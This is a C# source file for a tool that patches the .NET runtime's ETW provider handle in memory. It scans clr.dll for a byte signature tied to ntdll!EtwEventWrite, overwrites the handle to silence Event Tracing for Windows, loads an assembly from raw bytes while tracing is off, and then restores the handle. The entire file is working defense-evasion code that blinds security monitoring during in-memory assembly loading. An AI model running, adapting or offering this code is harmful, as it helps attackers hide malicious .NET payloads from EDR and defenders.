using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace ProviderHandlePatch {
    internal class Program {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        static bool isEtwFunction(IntPtr funcAddr, IntPtr etwEventWriteAddr) {
            int i = 0;
            while (true) {
                IntPtr currAddr = funcAddr + i;

                int b = Marshal.ReadByte(currAddr);
                if (b == 0xc3) {
                    break; // ret
                }

                int next_b = Marshal.ReadByte(currAddr + 1);

                //Console.WriteLine("addr: 0x" + (currAddr).ToString("X") + ", b: 0x" + b.ToString("X") + ", next_b: 0x" + next_b.ToString("X"));

                if (b != 0xff || next_b != 0x15) {
                    i += 1;
                    continue;
                }

                int iatOffset = Marshal.ReadInt32(currAddr + 2);
                IntPtr rip = currAddr + 6;
                IntPtr iatAddr = rip + iatOffset;

                //Console.WriteLine("rip: 0x" + rip.ToString("X"));
                //Console.WriteLine("IAT address: 0x" + iatAddr.ToString("X"));

                if (etwEventWriteAddr == (IntPtr)Marshal.ReadInt64(iatAddr)) {
                    return true;
                }

                i += 1;
            }
            return false;
        }

        static int getClrSize(IntPtr clrBase) {
            Console.WriteLine("CLR Base: " + clrBase.ToString("X"));
            int peOffset = Marshal.ReadInt32(clrBase + 0x3C);
            IntPtr optionalHeaderPtr = clrBase + peOffset + 0x18;
            int sizeOfImage = Marshal.ReadInt32(optionalHeaderPtr + 0x38);
            Console.WriteLine("CLR SizeOfImage: 0x" + sizeOfImage.ToString("X"));

            return sizeOfImage;
        }

        static IntPtr FindDotNETRuntimeHandle() {
            IntPtr clrBase = GetImageBase("clr.dll");
            int clrSize = getClrSize(clrBase);
            IntPtr clrEnd = clrBase + clrSize;

            IntPtr ntdllBase = GetImageBase("ntdll.dll");
            IntPtr etwEventWriteAddr = GetProcAddress(ntdllBase, "EtwEventWrite");
            Console.WriteLine("ntdll!EtwEventWrite address: 0x" + etwEventWriteAddr.ToString("X"));

            Dictionary<IntPtr, int> handleAddrCount = new Dictionary<IntPtr, int>();

            String[] pattern = new string[] { "48", "8b", "0d", "??", "??", "??", "??", "e8" };

            for (long addr = (long)clrBase; addr < (long)(clrEnd - pattern.Length); addr++) {
                for (int i = 0; i < pattern.Length; i++) {
                    if (pattern[i] == "??") {
                        continue;
                    }

                    int b = Marshal.ReadByte((IntPtr)addr + i);
                    int target_b = Convert.ToInt32(pattern[i], 16);

                    if (b != target_b) {
                        break;
                    }

                    if (i != pattern.Length - 1) {
                        continue;
                    }

                    int callOffset = Marshal.ReadInt32((IntPtr)addr + pattern.Length);
                    IntPtr rip = (IntPtr)(addr + pattern.Length + 4);
                    IntPtr callAddr = rip + callOffset;
                    //Console.WriteLine("Signature found at: 0x" + addr.ToString("X"));
                    //Console.WriteLine("Call to: 0x" + callAddr.ToString("X"));

                    if (!isEtwFunction(callAddr, etwEventWriteAddr)) {
                        continue;
                    }

                    //Console.WriteLine("Found!");
                    int handleOffset = Marshal.ReadInt32((IntPtr)addr + 3);
                    IntPtr handleAddr = (IntPtr)addr + 7 + handleOffset;

                    Console.WriteLine("Handle: 0x" + handleAddr.ToString("X"));

                    if (handleAddrCount.ContainsKey(handleAddr)) {
                        handleAddrCount[handleAddr]++;
                    } else { 
                        handleAddrCount[handleAddr] = 1;
                    }
                }
            }

            IntPtr topAddr = IntPtr.Zero;
            foreach (var item in handleAddrCount) {
                if (topAddr == IntPtr.Zero || item.Value > handleAddrCount[topAddr]) {
                    topAddr = item.Key;
                }
            }

            return topAddr;
        }

        static void TurnOffETW(IntPtr DotNETRuntimeHandle_addr, out long DotNETRuntimeHandle_val) {
            DotNETRuntimeHandle_val = Marshal.ReadInt64(DotNETRuntimeHandle_addr);
            Marshal.WriteInt64(DotNETRuntimeHandle_addr, 1);
            Console.WriteLine("DotNETRuntimeHandle: 0x" + DotNETRuntimeHandle_val.ToString("X"));
        }

        static void TurnOnETW(IntPtr DotNETRuntimeHandle_addr, long DotNETRuntimeHandle_val) {
            Marshal.WriteInt64(DotNETRuntimeHandle_addr, DotNETRuntimeHandle_val);
        }

        static IntPtr GetImageBase(String dllName) {
            foreach (ProcessModule module in Process.GetCurrentProcess().Modules) {
                if (module.ModuleName.Equals(dllName, StringComparison.OrdinalIgnoreCase)) {
                    return module.BaseAddress;
                }
            }
            return IntPtr.Zero;
        }

        static void Main(string[] args) {
            IntPtr clrBase = GetImageBase("clr.dll");
            Console.WriteLine("clr.dll located at " + clrBase.ToString("X"));

            IntPtr DotNETRuntimeHandle_addr = FindDotNETRuntimeHandle();
            Console.WriteLine("FindDotNETRuntimeHandle: 0x" + DotNETRuntimeHandle_addr.ToString("X"));
            
            long DotNETRuntimeHandle_val = 0;
            TurnOffETW(DotNETRuntimeHandle_addr, out DotNETRuntimeHandle_val);
            
            // filename is the .NET assembly executable on disk to load. 
            String filename = "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\RegAsm.exe";
            Byte[] bytes = File.ReadAllBytes(filename);
            Assembly asm = Assembly.Load(bytes);
            Console.WriteLine(asm);

            TurnOnETW(DotNETRuntimeHandle_addr, DotNETRuntimeHandle_val);
        }
    }
}